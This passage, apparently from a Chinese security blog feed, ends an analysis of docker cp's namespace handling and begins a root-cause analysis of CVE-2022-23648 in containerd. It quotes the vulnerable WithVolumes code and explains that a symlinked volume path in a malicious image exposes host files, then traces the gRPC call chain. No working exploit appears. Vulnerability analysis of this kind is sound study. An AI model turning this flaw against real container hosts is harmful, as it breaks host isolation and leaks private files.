class="hljs-keyword">func</span> <span class="hljs-params">(vw *containerFSView)</span></span> GoInFS(ctx context.Context, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> vw.todo &lt;- future&#123;fn: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123; fn(); <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> &#125;&#125;:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span> ctx.Err()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现该函数实际上是将参数中的fn函数构建了一个future的结构体传入了容器文件系统的todo的channel中，那么todo是什么时候被调用的呢？在调用GoInFS之前，我们需要先使用openContainerFS函数获取一个容器的文件系统对象。这个函数的内部具体实现如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> openContainerFS(container *container.Container) (_ *containerFSView, err <span class="hljs-type">error</span>) &#123;<br>...<br>todo := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> future)<br>...<br>err = unshare.Go(unix.CLONE_NEWNS,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br>dest, err := container.GetResourcePath(m.Destination)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">var</span> stat os.FileInfo<br>stat, err = os.Stat(m.Source)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> err := fileutils.CreateIfNotExists(dest, stat.IsDir()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>bindMode := <span class="hljs-string">&quot;rbind&quot;</span><br><span class="hljs-keyword">if</span> m.NonRecursive &#123;<br>bindMode = <span class="hljs-string">&quot;bind&quot;</span><br>&#125;<br>writeMode := <span class="hljs-string">&quot;ro&quot;</span><br><span class="hljs-keyword">if</span> m.Writable &#123;<br>writeMode = <span class="hljs-string">&quot;rw&quot;</span><br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyNonRecursive&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &amp;&amp; m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: ReadOnlyNonRecursive &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br><br>opts := strings.Join([]<span class="hljs-type">string</span>&#123;bindMode, writeMode, <span class="hljs-string">&quot;rprivate&quot;</span>&#125;, <span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">if</span> err := mount.Mount(m.Source, dest, <span class="hljs-string">&quot;&quot;</span>, opts); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !m.Writable &amp;&amp; !m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">if</span> err := makeMountRRO(dest); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> err<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log.G(context.TODO()).WithError(err).Debugf(<span class="hljs-string">&quot;Failed to make %q recursively read-only&quot;</span>, dest)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(container.BaseFS)<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(done)<br><br><span class="hljs-keyword">for</span> it := <span class="hljs-keyword">range</span> todo &#123;<br>err := it.fn()<br><span class="hljs-keyword">if</span> it.res != <span class="hljs-literal">nil</span> &#123;<br>it.res &lt;- err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// The thread will terminate when this goroutine returns, taking the</span><br><span class="hljs-comment">// mount namespace and all the volume bind-mounts with it.</span><br>&#125;,<br>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数向unshare.Go函数传递一个unix.CLONE_NEWNS参数和两个函数类型的参数，我们先看第一个函数类型的参数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br>dest, err := container.GetResourcePath(m.Destination)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">var</span> stat os.FileInfo<br>stat, err = os.Stat(m.Source)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> err := fileutils.CreateIfNotExists(dest, stat.IsDir()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>bindMode := <span class="hljs-string">&quot;rbind&quot;</span><br><span class="hljs-keyword">if</span> m.NonRecursive &#123;<br>bindMode = <span class="hljs-string">&quot;bind&quot;</span><br>&#125;<br>writeMode := <span class="hljs-string">&quot;ro&quot;</span><br><span class="hljs-keyword">if</span> m.Writable &#123;<br>writeMode = <span class="hljs-string">&quot;rw&quot;</span><br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyNonRecursive&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &amp;&amp; m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: ReadOnlyNonRecursive &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br><br><br>opts := strings.Join([]<span class="hljs-type">string</span>&#123;bindMode, writeMode, <span class="hljs-string">&quot;rprivate&quot;</span>&#125;, <span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">if</span> err := mount.Mount(m.Source, dest, <span class="hljs-string">&quot;&quot;</span>, opts); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !m.Writable &amp;&amp; !m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">if</span> err := makeMountRRO(dest); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> err<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log.G(context.TODO()).WithError(err).Debugf(<span class="hljs-string">&quot;Failed to make %q recursively read-only&quot;</span>, dest)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(container.BaseFS)<br>&#125;,<br></code></pre></td></tr></table></figure><p>该函数进行了一些挂载操作之后使用mounttree.SwitchRoot函数切换到容器的跟文件系统<br>再看第二个函数类型参数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">for</span> it := <span class="hljs-keyword">range</span> todo &#123;<br>err := it.fn()<br><span class="hljs-keyword">if</span> it.res != <span class="hljs-literal">nil</span> &#123;<br>it.res &lt;- err<br>&#125;<br>&#125;<br><br>&#125;,<br></code></pre></td></tr></table></figure><p>该函数的主要作用就是获取todo channel中的函数进行执行。<br>最后我们再来看一下unshare.Go具体做了什么</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Go</span><span class="hljs-params">(flags <span class="hljs-type">int</span>, setupfn <span class="hljs-keyword">func</span>()</span></span> <span class="hljs-type">error</span>, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>...<br>        <span class="hljs-keyword">if</span> err := unix.Unshare(flags); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- os.NewSyscallError(<span class="hljs-string">&quot;unshare&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> setupfn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := setupfn(); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- err<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(started)<br><br><span class="hljs-keyword">if</span> fn != <span class="hljs-literal">nil</span> &#123;<br>fn()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> &lt;-started<br>&#125;<br></code></pre></td></tr></table></figure><p>unshare.Go函数先是调用unshare的系统调用创建了一个新的命名空间，然后一次调用第一个函数类型参数和第二个函数类型参数。综上所述，我们可以大致了解docker daemon是如何将一个函数限制在容器文件系统上下文中的了：首先使用unshare系统调用创建一个新的命名空间，将容器的文件挂载进该命名空间，并切换到容器的文件系统中，之后再调用用户想要执行的函数，此时这个函数就被限制在了容器的文件系统上下文中。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>无论是从容器中向宿主机复制文件还是从宿主机向容器复制文件，docker daemon都只负责容器的文件处理部分，docker client都只负责宿主机的文件处理部分，二者通过api接口进行通信，并且docker client和docker daemon的操作是互逆的，即docker client负责打包时，docker daemon则负责解包。<br>简单总结一下docker cp的流程，以从容器向宿主机复制文件为例。当我们使用类似docker cp containerid:containerFile hostDir的命令从容器内部向宿主机复制文件时，此时命令中的docker 实际上是docker client。docker client接受到用户输入的参数后判断出源文件路径和目标文件路径以及传输类型，之后根据传输类型进行不同的处理逻辑。在此例子中会进入到copyToContainer函数进行处理，此时docker client负责将源文件路径的文件进行打包。之后将打包好的文件信息以及容器信息，目标文件路径信息通过接口传递给docker daemon。docker daemon监听api接口发现有request时会根据api接口的不同进入不同的处理逻辑，此例子中，docker daemon会将传输过来的打包好的文件进行解包并将其移动到容器的目标文件路径下。当然这只是简单的描述一下整体的流程，这其中肯定会涉及到很多细节，如链接的处理，容器文件系统和宿主机文件系统的隔离，权限的判定等等。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-23648漏洞分析</title>
    <link href="/cllafrcoj0005foutadmn1dyv/"/>
    <url>/cllafrcoj0005foutadmn1dyv/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-23648漏洞分析"><a href="#CVE-2022-23648漏洞分析" class="headerlink" title="CVE-2022-23648漏洞分析"></a>CVE-2022-23648漏洞分析</h1><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>此次漏洞出现在containerd组件中，当我们创建了一个恶意的镜像容器时，攻击者可以通过此漏洞读取主机上的任意文件和目录。实际上这也是一个由于没有正确处理文件链接所导致的一个漏洞。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据github上containerd官方的修复<a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">commit</a>显示，漏洞点在&#x2F;pkg&#x2F;cri&#x2F;opts&#x2F;container.go的WithVolumes函数中。那么接下来就分析一下这个函数是如何被调用的以及是如何出现漏洞的。</p><h2 id="漏洞函数分析"><a href="#漏洞函数分析" class="headerlink" title="漏洞函数分析"></a>漏洞函数分析</h2><p>存在漏洞的函数如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithVolumes</span><span class="hljs-params">(volumeMounts <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)</span></span> containerd.NewContainerOpts &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, client *containerd.Client, c *containers.Container)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>root, err := os.MkdirTemp(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ctd-volume&quot;</span>)<br>...<br>        <span class="hljs-keyword">var</span> mountPaths []<span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> goruntime.GOOS == <span class="hljs-string">&quot;windows&quot;</span> &#123;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br><span class="hljs-comment">// appending the layerID to the root.</span><br>mountPath := filepath.Join(root, filepath.Base(m.Source))<br>mountPaths = <span class="hljs-built_in">append</span>(mountPaths, mountPath)<br><span class="hljs-keyword">if</span> err := m.Mount(mountPath); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">defer</span> unmounter(m.Source)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mountPaths = <span class="hljs-built_in">append</span>(mountPaths, root)<br><span class="hljs-keyword">if</span> err := mount.All(mounts, root); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;failed to mount: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> unmounter(root)<br>&#125;<br><span class="hljs-keyword">for</span> host, volume := <span class="hljs-keyword">range</span> volumeMounts &#123;<br>...<br><span class="hljs-keyword">for</span> _, mountPath := <span class="hljs-keyword">range</span> mountPaths &#123;<br>src := filepath.Join(mountPath, volume)<br><span class="hljs-keyword">if</span> _, err := os.Stat(src); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br><span class="hljs-comment">// Skip copying directory if it does not exist.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;stat volume in rootfs: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := copyExistingContents(src, host); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;taking runtime copy of volume: %w&quot;</span>, err)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在该函数中，进行了一次卷内文件和容器内文件的同步，但是其中的src可控并且没有对src是否为链接文件进行处理，导致攻击者可以通过将src链接到某个文件实现将宿主机上任意文件的只读副本复制进容器内部。</p><h2 id="漏洞函数调用链"><a href="#漏洞函数调用链" class="headerlink" title="漏洞函数调用链"></a>漏洞函数调用链</h2><p>在containerd项目的cmd&#x2F;containerd&#x2F;main.go的main函数中调用了command.App函数。在该函数中新开启了一个go协程调用server.New函数创建并初始化了一个containerd server</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">App</span><span class="hljs-params">()</span></span> *cli.App &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(chsrv)<br><br>server, err := server.New(ctx, config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> chsrv &lt;- srvResp&#123;err: err&#125;:<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// Launch as a Windows Service if necessary</span><br><span class="hljs-keyword">if</span> err := launchService(server, done); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Fatal(err)<br>&#125;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br>server.Stop()<br><span class="hljs-keyword">case</span> chsrv &lt;- srvResp&#123;s: server&#125;:<br>&#125;<br>&#125;()<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>在server.New函数中嗲用service.Register函数注册了一系列的grpc服务</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> grpcServices &#123;<br><span class="hljs-keyword">if</span> err := service.Register(grpcServer); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>service.Register函数是一个接口函数，实际执行注册逻辑的是下面的函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *criService)</span></span> register(s *grpc.Server) <span class="hljs-type">error</span> &#123;<br>instrumented := newInstrumentedService(c)<br>runtime.RegisterRuntimeServiceServer(s, instrumented)<br>runtime.RegisterImageServiceServer(s, instrumented)<br>instrumentedAlpha := newInstrumentedAlphaService(c)<br>runtime_alpha.RegisterRuntimeServiceServer(s, instrumentedAlpha)<br>runtime_alpha.RegisterImageServiceServer(s, instrumentedAlpha)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在上面的函数中为两类runtime（runtime和runtime_alpha）分别注册了ImageService和RuntimeService。runtime和runtime_alpha注册服务的逻辑大同小异，以runtime为例，我们主要关注其RuntimeService。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterRuntimeServiceServer</span><span class="hljs-params">(s *grpc.Server, srv RuntimeServiceServer)</span></span> &#123;<br>s.RegisterService(&amp;_RuntimeService_serviceDesc, srv)<br>&#125;<br></code></pre></td></tr></table></figure><p>其中_RuntimeService_serviceDesc的内容如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">var</span> _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;<br>ServiceName: <span class="hljs-string">&quot;runtime.v1.RuntimeService&quot;</span>,<br>HandlerType: (*RuntimeServiceServer)(<span class="hljs-literal">nil</span>),<br>Methods: []grpc.MethodDesc&#123;<br>&#123;<br>MethodName: <span class="hljs-string">&quot;Version&quot;</span>,<br>Handler:    _RuntimeService_Version_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;RunPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_RunPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;StopPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_StopPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;RemovePodSandbox&quot;</span>,<br>Handler:    _RuntimeService_RemovePodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;PodSandboxStatus&quot;</span>,<br>Handler:    _RuntimeService_PodSandboxStatus_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;ListPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_ListPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;CreateContainer&quot;</span>,<br>Handler:    _RuntimeService_CreateContainer_Handler,<br>&#125;,<br>...<br><br><br>&#125;,<br>Streams:  []grpc.StreamDesc&#123;&#125;,<br>Metadata: <span class="hljs-string">&quot;api.proto&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>在_RuntimeService_serviceDesc中包含了一系列的接口以及对应的处理函数，我们主要关注CreateContainer的处理函数<code>_RuntimeService_CreateContainer_Handler</code></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> _<span class="hljs-title">RuntimeService_CreateContainer_Handler</span><span class="hljs-params">(srv <span class="hljs-keyword">interface</span>&#123;&#125;, ctx context.Context, dec <span class="hljs-keyword">func</span>(<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">error</span>, interceptor grpc.UnaryServerInterceptor) (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>) &#123;<br>in := <span class="hljs-built_in">new</span>(CreateContainerRequest)<br><span class="hljs-keyword">if</span> err := dec(in); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span 